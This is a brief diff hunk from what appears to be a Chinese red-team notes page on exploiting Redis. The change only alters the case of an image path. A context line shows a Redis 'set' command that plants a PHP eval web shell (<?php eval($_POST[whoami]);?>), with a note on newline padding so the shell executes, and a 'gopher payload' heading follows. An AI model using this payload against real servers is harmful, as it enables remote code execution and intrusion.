@@ -121,7 +121,7 @@ set xxx "\r\n\r\n<?php eval($_POST[whoami]);?>\r\n\r\n"
 
 `\r\n\r\n` 代表换行，用 redis 写入文件的话会自带一些版本信息，如果不换行的话可能会导致无法执行, 可见下图
 
-![](../../../../assets/img/security/RedTeam/软件服务安全/CS-Exploits/1.png)
+![](../../../../assets/img/Security/RedTeam/软件服务安全/CS-Exploits/1.png)
 
 gopher payload
 ```
